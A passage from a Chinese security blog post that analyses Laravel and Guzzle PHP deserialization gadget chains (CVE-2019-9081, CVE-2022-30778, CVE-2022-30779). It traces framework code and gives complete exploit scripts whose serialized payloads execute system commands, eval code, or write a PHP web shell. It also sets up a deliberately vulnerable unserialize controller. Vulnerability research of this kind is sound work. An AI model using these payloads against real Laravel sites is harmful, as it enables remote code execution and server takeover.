<p>在build方法中，由于Illuminate\Contracts\Console\Kernel无法实例化然后报错了</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724150317385.png" alt="image-20230724150317385"></p>
<p>所以要跟进查看<code>$concrete = $this-&gt;getConcrete($abstract)</code>，让其一个可以实例化的<code>$concrete</code></p>
<pre><code class="php">protected function getConcrete($abstract)
    &#123;
        if (! is_null($concrete = $this-&gt;getContextualConcrete($abstract))) &#123;
            return $concrete;
        &#125;

        // If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just
        // assume each type is a concrete name and will attempt to resolve it as is
        // since the container should be able to resolve concretes automatically.
        if (isset($this-&gt;bindings[$abstract])) &#123;
            return $this-&gt;bindings[$abstract][&#39;concrete&#39;];
        &#125;

        return $abstract;
    &#125;
</code></pre>
<p>该方法用于获取给定抽象类型（$abstract）对应的具体实现类。首先，代码会检查是否存在上下文相关的具体实现（Contextual Concrete）。如果存在，即在容器中为该抽象类型设置了上下文绑定，则直接返回上下文相关的具体实现。</p>
<p>如果没有上下文相关的具体实现，代码会继续判断是否在容器的绑定数组（$this-&gt;bindings）中存在对该抽象类型的绑定。如果存在，即为该抽象类型设置了绑定，那么代码会返回该绑定定义中的具体实现（’concrete’ 字段）。</p>
<p>如果以上两种情况都不满足，即既没有上下文相关的具体实现，也没有显式的绑定定义，那么代码会默认将抽象类型作为具体实现来返回。</p>
<p>这里的<code>$this-&gt;bindings</code>是可控的，可以构造</p>
<pre><code class="php">$this-&gt;bindings=[&quot;Illuminate\\Contracts\\Console\\Kernel&quot;=&gt;[&quot;concrete&quot;=&gt;&quot;Illuminate\\Container\\Container&quot;]];
</code></pre>
<p>然后这里就会返回<code>Illuminate\Container\Container</code>这个类</p>
<p>第一次运行到<code>resolve</code>时，走的是make方法，</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724151523216.png" alt="image-20230724151523216"></p>
<pre><code class="php">public function make($abstract, array $parameters = [])
    &#123;
        return $this-&gt;resolve($abstract, $parameters);
    &#125;
</code></pre>
<p>由于make调用了<code>$this-&gt;resolve</code>,又回到这里，但是这次走的是build方法</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724151820887.png" alt="image-20230724151820887"></p>
<p>到最后返回run()的是<code>Illuminate\Container\Container</code>这个类的对象，然后调用这个对象的call方法</p>
<p>这个call方法中的参数<code>$this-&gt;command</code>, <code>$this-&gt;parameters</code>可控，也就是下面的$callback和<code>$parameters</code></p>
<pre><code class="php">public function call($callback, array $parameters = [], $defaultMethod = null)
    &#123;
        return BoundMethod::call($this, $callback, $parameters, $defaultMethod);
    &#125;
</code></pre>
<p>跟进<code>BoundMethod::call</code></p>
<pre><code class="php">public static function call($container, $callback, array $parameters = [], $defaultMethod = null)
    &#123;
        if (static::isCallableWithAtSign($callback) || $defaultMethod) &#123;
            return static::callClass($container, $callback, $parameters, $defaultMethod);
        &#125;

        return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) &#123;
            return call_user_func_array(
                $callback, static::getMethodDependencies($container, $callback, $parameters)
            );
        &#125;);
    &#125;
</code></pre>
<p>可以看到<code>call_user_func_array</code>函数，调试发现$callback&#x3D;”system“是不会进入if语句的，重点放在后面</p>
<p>跟进getMethodDependencies</p>
<pre><code class="php">protected static function getMethodDependencies($container, $callback, array $parameters = [])
    &#123;
        $dependencies = [];

        foreach (static::getCallReflector($callback)-&gt;getParameters() as $parameter) &#123;
            static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);
        &#125;

        return array_merge($dependencies, $parameters);
    &#125;
</code></pre>
<p>这个方法通过反射获取回调函数或方法的参数列表，然后根据参数列表中每个参数的类型和名称，解析对应的依赖关系。最终将解析出来的依赖关系和额外参数合并返回。</p>
<p>所以<code>$parameters</code>即<code>$this-&gt;parameters</code>是一个数组</p>
<pre><code class="php">$this-&gt;parameters = array(&#39;calc&#39;);
</code></pre>
<p>返回后调用<code>call_user_func_array</code>,执行了代码system(“calc”);</p>
<p>最终的exp:</p>
<pre><code class="php">&lt;?php
namespace Illuminate\Foundation\Testing;
use Illuminate\Container\Container;
use Faker\DefaultGenerator;
class PendingCommand
&#123;
    protected $parameters;
    public $test;
    protected $app;
    protected $command;

    public function __construct()
    &#123;
        $this-&gt;command = &quot;system&quot;;
        $this-&gt;parameters = array(&#39;calc&#39;);
        $this-&gt;test = new DefaultGenerator();
        $this-&gt;app = new Container();
    &#125;
&#125;
namespace Faker;
class DefaultGenerator
&#123;
    protected $default;

    public function __construct()
    &#123;
        $this-&gt;default = [&#39;a&#39;];
    &#125;
&#125;

namespace Illuminate\Container;
class Container
&#123;
    protected $bindings = [];
    public function __construct()
    &#123;
        $this-&gt;bindings=[&quot;Illuminate\\Contracts\\Console\\Kernel&quot;=&gt;[&quot;concrete&quot;=&gt;&quot;Illuminate\\Container\\Container&quot;]];
    &#125;
&#125;
use Illuminate\Foundation\Testing\PendingCommand;
$a = new PendingCommand();
echo urlencode(serialize($a));
</code></pre>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724153739330.png" alt="image-20230724153739330"></p>
<h3 id="5-8-x-CVE-2022-30778"><a href="#5-8-x-CVE-2022-30778" class="headerlink" title="5.8.x(CVE-2022-30778)"></a>5.8.x(CVE-2022-30778)</h3><p>环境搭建</p>
<pre><code>composer create-project laravel/laravel laravel-5.8 --prefer-dist &quot;5.8&quot;
</code></pre>
<p>添加控制器：<code>Http/Controllers/POPController.php</code></p>
<pre><code class="php">&lt;?php
namespace App\Http\Controllers;
class POPController extends Controller
&#123;
    public function index()
    &#123;
        if(isset($_GET[&#39;c&#39;]))&#123;
            $c = $_GET[&#39;c&#39;];
            unserialize($c);
        &#125;
        else&#123;
            phpinfo();
        &#125;
    &#125;
&#125;
</code></pre>
<p>添加路由<code>routes/web.php</code></p>
<pre><code class="php">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@index&quot;);
</code></pre>
<p>在寻找新链子之前，看看上一个还能不能用，测试发现CVE-2019-9081这条链子还是能用的</p>
<h4 id="POP1"><a href="#POP1" class="headerlink" title="POP1"></a>POP1</h4><p>寻找入口__destruct()和5.4的一样，在<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code></p>
<pre><code class="php">public function __destruct()
    &#123;
        $this-&gt;events-&gt;dispatch($this-&gt;event);
    &#125;
</code></pre>
<p>这个 <code>$this-&gt;events</code>可控,这里可以从两个方面入手，一个是__call 另一个是任意类的dispatch方法</p>
<p>这条链子使用的是vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Bus&#x2F;Dispatcher.php的<code>dispatch</code>方法</p>
<pre><code class="php">public function dispatch($command)
    &#123;
        if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123;
            return $this-&gt;dispatchToQueue($command);
        &#125;
        return $this-&gt;dispatchNow($command);
    &#125;
</code></pre>
<p>$this-&gt;queueResolver可控，跟进<code>commandShouldBeQueued()</code></p>
<pre><code class="php">protected function commandShouldBeQueued($command)
    &#123;
        return $command instanceof ShouldQueue;
    &#125;
</code></pre>
<p>如果<code>$command</code>是ShouldQueue的实现类，就会返回true，然后调用<code>dispatchToQueue()</code></p>
<pre><code class="php">public function dispatchToQueue($command)
    &#123;
        $connection = $command-&gt;connection ?? null;

        $queue = call_user_func($this-&gt;queueResolver, $connection);

        if (! $queue instanceof Queue) &#123;
            throw new RuntimeException(&#39;Queue resolver did not return a Queue implementation.&#39;);
        &#125;

        if (method_exists($command, &#39;queue&#39;)) &#123;
            return $command-&gt;queue($queue, $command);
        &#125;

        return $this-&gt;pushCommandToQueue($queue, $command);
    &#125;
</code></pre>
<p>这里很明显的看到call_user_func()  这个<code>$this-&gt;queueResolver</code>可控，并且<code> $command-&gt;connection</code>这个也可控</p>
<p>所以这里就可以任意命令执行了</p>
<p>现在要找到一个ShouldQueue的实现类，直接搜就行，即使其没有<code>connection</code>属性</p>
<p>这里找到的是<code>Illuminate\Broadcasting\BroadcastEvent</code></p>
<p>最后的exp:</p>
<pre><code class="php">&lt;?php
namespace Illuminate\Broadcasting;
use Illuminate\Bus\Dispatcher;
use Illuminate\Broadcasting\BroadcastEvent;
class PendingBroadcast
&#123;
    protected $events;
    protected $event;
    public function __construct()
    &#123;
        $this-&gt;events=new Dispatcher();
        $this-&gt;event=new BroadcastEvent();
    &#125;
&#125;

namespace Illuminate\Bus;
class Dispatcher
&#123;
    protected $queueResolver;
    public function __construct()
    &#123;
        $this-&gt;queueResolver=&quot;system&quot;;
    &#125;
&#125;

namespace Illuminate\Contracts\Queue;
interface ShouldQueue
&#123;

&#125;

namespace Illuminate\Broadcasting;
use Illuminate\Contracts\Queue\ShouldQueue;
class BroadcastEvent implements ShouldQueue
&#123;
    public $connection;
    public function __construct()
    &#123;
        $this-&gt;connection=&quot;calc&quot;;
    &#125;
&#125;


use  Illuminate\Broadcasting\PendingBroadcast;
$a = new PendingBroadcast();
echo urlencode(serialize($a));
</code></pre>
<h4 id="POP2"><a href="#POP2" class="headerlink" title="POP2"></a>POP2</h4><p>上面的这条链子还没完，还可以往下走，就是执行到<code>call_user_func()</code>的时候，不执行命令，这里是可以执行任意类的任意方法的</p>
<p>所以找到的是vendor&#x2F;mockery&#x2F;mockery&#x2F;library&#x2F;Mockery&#x2F;Loader&#x2F;EvalLoader.php</p>
<pre><code class="php">class EvalLoader implements Loader
&#123;
    public function load(MockDefinition $definition)
    &#123;
        if (class_exists($definition-&gt;getClassName(), false)) &#123;
            return;
        &#125;

        eval(&quot;?&gt;&quot; . $definition-&gt;getCode());
    &#125;
&#125;
</code></pre>
<p>这个<code>eval(&quot;?&gt;&quot; . $definition-&gt;getCode())</code>可以实现任意代码执行，</p>
<pre><code class="php">public function getCode()
    &#123;
        return $this-&gt;code;
    &#125;
</code></pre>
<p>$this-&gt;code可控，剩下的就是让代码走到这个地方</p>
<p>最后的exp:</p>
<pre><code class="php">&lt;?php
namespace Illuminate\Broadcasting;
use Illuminate\Bus\Dispatcher;
use Illuminate\Broadcasting\BroadcastEvent;
class PendingBroadcast
&#123;
    protected $events;
    protected $event;
    public function __construct()
    &#123;
        $this-&gt;events=new Dispatcher();
        $this-&gt;event=new BroadcastEvent();
    &#125;
&#125;
namespace Illuminate\Bus;
use Mockery\Loader\EvalLoader;
class Dispatcher
&#123;
    protected $queueResolver;
    public function __construct()
    &#123;
        $this-&gt;queueResolver=array(new EvalLoader(),&quot;load&quot;);
    &#125;
&#125;
namespace Illuminate\Contracts\Queue;
interface ShouldQueue
&#123;

&#125;

namespace Illuminate\Broadcasting;
use Illuminate\Contracts\Queue\ShouldQueue;
use Mockery\Generator\MockDefinition;
class BroadcastEvent implements ShouldQueue
&#123;
    public $connection;
    public function __construct()
    &#123;
        $this-&gt;connection=new MockDefinition();
    &#125;
&#125;

namespace Mockery\Loader;
class EvalLoader
&#123;
&#125;

namespace Mockery\Generator;
class MockDefinition
&#123;
    protected $config;
    protected $code;
    public function __construct()
    &#123;
        $this-&gt;code=&quot;&lt;?php system(&#39;calc&#39;);?&gt;&quot;;
        $this-&gt;config=new MockConfiguration();

    &#125;
&#125;

namespace Mockery\Generator;
class MockConfiguration
&#123;

&#125;

use  Illuminate\Broadcasting\PendingBroadcast;
$a = new PendingBroadcast();
echo urlencode(serialize($a));
</code></pre>
<h4 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h4><p>入口点依旧是<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code></p>
<pre><code class="php">public function __destruct()
&#123;
   $this-&gt;events-&gt;dispatch($this-&gt;event);
&#125;
</code></pre>
<p>这条链子是触发__call这个方向</p>
<p>这里触发的是<code>vendor/laravel/framework/src/Illuminate/Validation/Validator.php</code></p>
<pre><code class="php">public function __call($method, $parameters)
    &#123;
        $rule = Str::snake(substr($method, 8));

        if (isset($this-&gt;extensions[$rule])) &#123;
            return $this-&gt;callExtension($rule, $parameters);
        &#125;

        throw new BadMethodCallException(sprintf(
            &#39;Method %s::%s does not exist.&#39;, static::class, $method
        ));
    &#125;
</code></pre>
<p><code>$this-&gt;extensions[$rule]</code>可控，跟进<code>callExtension()</code></p>
<pre><code class="php">protected function callExtension($rule, $parameters)
    &#123;
        $callback = $this-&gt;extensions[$rule];

        if (is_callable($callback)) &#123;
            return call_user_func_array($callback, $parameters);
        &#125; elseif (is_string($callback)) &#123;
            return $this-&gt;callClassBasedExtension($callback, $parameters);
        &#125;
    &#125;
</code></pre>
<p>这里可以看到<code> call_user_func_array($callback, $parameters)</code>,两个参数都可控，所以这里是可以任意命令执行的</p>
<p>需要构造</p>
<pre><code class="php">$callback = $this-&gt;extensions[$rule] = &quot;system&quot;
$this-&gt;event = &quot;calc&quot;
</code></pre>
<p>经过调试发现<code>$rule=&quot;&quot;</code>,所以需要<code>$this-&gt;extensions=[&quot;&quot;=&gt;&quot;system&quot;];</code></p>
<p>最后的exp:</p>
<pre><code class="php">&lt;?php
namespace Illuminate\Broadcasting;
use Illuminate\Validation\Validator;
class PendingBroadcast
&#123;
    protected $events;
    protected $event;
    public function __construct()
    &#123;
        $this-&gt;events=new Validator();
        $this-&gt;event=&quot;calc&quot;;
    &#125;
&#125;
namespace Illuminate\Validation;
class Validator
&#123;
    public $extensions = [];
    public function __construct()
    &#123;
        $this-&gt;extensions=[&quot;&quot;=&gt;&quot;system&quot;];
    &#125;

&#125;

use  Illuminate\Broadcasting\PendingBroadcast;
$a = new PendingBroadcast();
echo urlencode(serialize($a));
</code></pre>
<h3 id="CVE-2022-30779（-lt-x3D-9-1-8）"><a href="#CVE-2022-30779（-lt-x3D-9-1-8）" class="headerlink" title="CVE-2022-30779（&lt;&#x3D;9.1.8）"></a>CVE-2022-30779（&lt;&#x3D;9.1.8）</h3><p>测试环境是8.x</p>
<p>入口点在<code>vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code></p>
<pre><code class="php">public function __destruct()
    &#123;
        $this-&gt;save($this-&gt;filename);
    &#125;
</code></pre>
<p>这个<code>$this-&gt;filename</code>可控，跟进save()</p>
<pre><code class="php">public function save(string $filename): void
    &#123;
        $json = [];
        /** @var SetCookie $cookie */
        foreach ($this as $cookie) &#123;
            if (CookieJar::shouldPersist($cookie, $this-&gt;storeSessionCookies)) &#123;
                $json[] = $cookie-&gt;toArray();
            &#125;
        &#125;

        $jsonStr = Utils::jsonEncode($json);
        if (false === \file_put_contents($filename, $jsonStr, \LOCK_EX)) &#123;
            throw new \RuntimeException(&quot;Unable to save file &#123;$filename&#125;&quot;);
        &#125;
    &#125;
</code></pre>
<p>这个方法存在一个<code>file_put_contents</code>而且<code>$filename</code>可控</p>
<p>$jsonStr是来自下面这个函数，$this-&gt;data可控</p>
<pre><code class="php">public function toArray(): array
    &#123;
        return $this-&gt;data;
    &#125;
</code></pre>
<p>跟进CookieJar::shouldPersist让其返回true</p>
<pre><code class="php">public static function shouldPersist(SetCookie $cookie, bool $allowSessionCookies = false): bool
    &#123;
        if ($cookie-&gt;getExpires() || $allowSessionCookies) &#123;
            if (!$cookie-&gt;getDiscard()) &#123;
                return true;
            &#125;
        &#125;

        return false;
    &#125;
</code></pre>
<p>其中</p>
<pre><code class="php">public function getExpires()
&#123;
  return $this-&gt;data[&#39;Expires&#39;];
&#125;

public function getDiscard()
&#123;
   return $this-&gt;data[&#39;Discard&#39;];
&#125;
</code></pre>
<p>整个过程都是可控的，说明可以写shell</p>
<p>POC</p>
<pre><code class="php">&lt;?php
namespace GuzzleHttp\Cookie;
class FileCookieJar extends CookieJar
    &#123;
        private $filename;
        private $storeSessionCookies;

        public function __construct()
        &#123;
            parent::__construct();
            $this-&gt;filename = &quot;shell.php&quot;;
            $this-&gt;storeSessionCookies = true;
        &#125;
    &#125;

class CookieJar&#123;
        private $cookies = [];
        function __construct()
        &#123;
            $this-&gt;cookies[] = new SetCookie();
        &#125;
    &#125;
class SetCookie
&#123;
    private $data;
    function __construct()
    &#123;
        $this-&gt;data[&#39;Expires&#39;] = &#39;&lt;?php phpinfo();?&gt;&#39;;
        $this-&gt;data[&#39;Discard&#39;] = 0;

    &#125;
&#125;

use GuzzleHttp\Cookie\FileCookieJar;
echo urlencode(serialize(new FileCookieJar()));
</code></pre>
<p>在网站根目录生成shell.php，直接访问就行<a target="_blank" rel="noopener" href="http://x.x.x.x/shell.php">http://x.x.x.x/shell.php</a></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230725174600751.png" alt="image-20230725174600751"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/">http://example.com/2023/08/02/Laravel漏洞合集/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/wallhaven-5gm5p5_2560x1440.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/15/Fastjson%E7%B3%BB%E5%88%97/" title="Fastjson系列"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-85965k_1920x1080.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Fastjson系列</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/" title="Commons-Collections反序列化链合集"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-j3eemp_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Commons-Collections反序列化链合集</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP 代码审计"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-y8wozk_2560x1440.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-08</div><div class="title">ThinkPHP 代码审计</div></div></a></div><div><a href="/2023/07/13/%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="迅睿CMS反序列化漏洞"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-jx9odp_2560x1440.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-13</div><div class="title">迅睿CMS反序列化漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">Laravel漏洞合集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-ignore"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入(ignore)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-3129-debug-rce"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2021-3129(debug rce)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-x-CVE-2022-31279"><span class="toc-number">1.3.1.</span> <span class="toc-text">5.4.x (CVE-2022-31279)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-15133"><span class="toc-number">1.3.2.</span> <span class="toc-text">CVE-2018-15133</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-9081"><span class="toc-number">1.3.3.</span> <span class="toc-text">CVE-2019-9081</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-8-x-CVE-2022-30778"><span class="toc-number">1.3.4.</span> <span class="toc-text">5.8.x(CVE-2022-30778)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POP1"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">POP1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POP2"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">POP2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POP3"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">POP3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-30779%EF%BC%88-lt-x3D-9-1-8%EF%BC%89"><span class="toc-number">1.3.5.</span> <span class="toc-text">CVE-2022-30779（&lt;&#x3D;9.1.8）</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/03/CVE-2024-36401-GeoServer-XPath-rce/" title="CVE-2024-36401 GeoServer XPath rce"><img src="https://raw.githubusercontent.com/todis21/image/main/202304031628382.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CVE-2024-36401 GeoServer XPath rce"/></a><div class="content"><a class="title" href="/2024/07/03/CVE-2024-36401-GeoServer-XPath-rce/" title="CVE-2024-36401 GeoServer XPath rce">CVE-2024-36401 GeoServer XPath rce</a><time datetime="2024-07-03T03:41:52.000Z" title="发表于 2024-07-03 11:41:52">2024-07-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/26/Apache-Kafka-UI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Apache Kafka UI 远程代码执行漏洞分析"><img src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-x6gyyv_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Apache Kafka UI 远程代码执行漏洞分析"/></a><div class="content"><a class="title" href="/2024/06/26/Apache-Kafka-UI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Apache Kafka UI 远程代码执行漏洞分析">Apache Kafka UI 远程代码执行漏洞分析</a><time datetime="2024-06-26T06:44:32.000Z" title="发表于 2024-06-26 14:44:32">2024-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/01/Frida%E5%AD%A6%E4%B9%A0/" title="Frida学习"><img src="https://w.wallhaven.cc/full/76/wallhaven-76e1mv.jpg" onerror="this.onerror=null;this.src='/img/404.png'" alt="Frida学习"/></a><div class="content"><a class="title" href="/2024/04/01/Frida%E5%AD%A6%E4%B9%A0/" title="Frida学习">Frida学习</a><time datetime="2024-04-01T09:38:31.000Z" title="发表于 2024-04-01 17:38:31">2024-04-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/26/CVE-2024-23328%E5%88%86%E6%9E%90/" title="CVE-2024-23328分析"><img src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-kx62e1_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CVE-2024-23328分析"/></a><div class="content"><a class="title" href="/2024/03/26/CVE-2024-23328%E5%88%86%E6%9E%90/" title="CVE-2024-23328分析">CVE-2024-23328分析</a><time datetime="2024-03-26T03:28:40.000Z" title="发表于 2024-03-26 11:28:40">2024-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/18/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/" title="Xposed模块编写学习"><img src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-x6262z_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Xposed模块编写学习"/></a><div class="content"><a class="title" href="/2024/03/18/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/" title="Xposed模块编写学习">Xposed模块编写学习</a><time datetime="2024-03-18T15:13:31.000Z" title="发表于 2024-03-18 23:13:31">2024-03-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptioins'));
  mermaid.initialize(options);
}</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaid.length === 0) return
  const runMermaid = () => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    Array.from($mermaid).forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
      const mermaidID = 'mermaid-' + index
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)

      const renderV10 = () => {
        renderFn.then(({svg}) => {
          mermaidSrc.insertAdjacentHTML('afterend', svg)
        })
      }

      const renderV9 = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
    })
  }

  const loadMermaid = () => {
    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
  }

  btf.addModeChange('mermaid', runMermaid)

  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
